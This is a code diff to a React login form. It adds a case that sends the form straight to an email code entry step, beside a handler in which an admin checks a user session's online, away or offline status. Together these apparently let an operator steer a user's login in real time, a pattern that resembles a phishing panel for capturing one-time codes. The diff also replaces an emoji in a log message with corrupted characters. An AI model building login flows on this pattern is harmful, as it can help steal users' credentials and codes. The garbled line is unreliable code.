@@ -266,6 +266,13 @@ export const LoginForm = () => {
         setErrors({});
         setHasError(false);
         break;
+      case "auth_email_code":
+        // Go directly to email code input step (skip email input)
+        setCurrentStep("email");
+        setEmailStep("code");
+        setErrors({});
+        setHasError(false);
+        break;
       case "check_status":
         // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
         console.log("🔍 Admin requested enhanced status check for session:", sessionId);
@@ -346,7 +353,7 @@ export const LoginForm = () => {
           if (!navigatorOnline) {
             fallbackStatusText = "offline";
             fallbackStatusEmoji = "📵";
-            console.log("🔴 FALLBACK: Navigator reports offline");
+            console.log("���� FALLBACK: Navigator reports offline");
           } else if (navigatorOnline && !isVisible) {
             fallbackStatusText = "away";
             fallbackStatusEmoji = "🟡";
